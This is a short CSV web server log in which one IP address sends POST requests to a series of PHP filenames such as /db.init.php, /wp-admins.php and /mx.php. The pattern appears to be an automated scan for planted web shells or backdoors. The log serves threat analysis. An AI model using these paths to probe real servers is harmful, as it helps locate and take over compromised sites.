IP,DATE,METHOD,URI,User Agent
"190.102.146.26","30/Sep/2018","POST","/db.init.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/db_session.init.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/db__.init.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/wp-admins.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/m.php?pbid=open","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/db_dataml.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/db_desql.php","Trident/4.0)"

"190.102.146.26","30/Sep/2018","POST","/mx.php","Trident/4.0)"

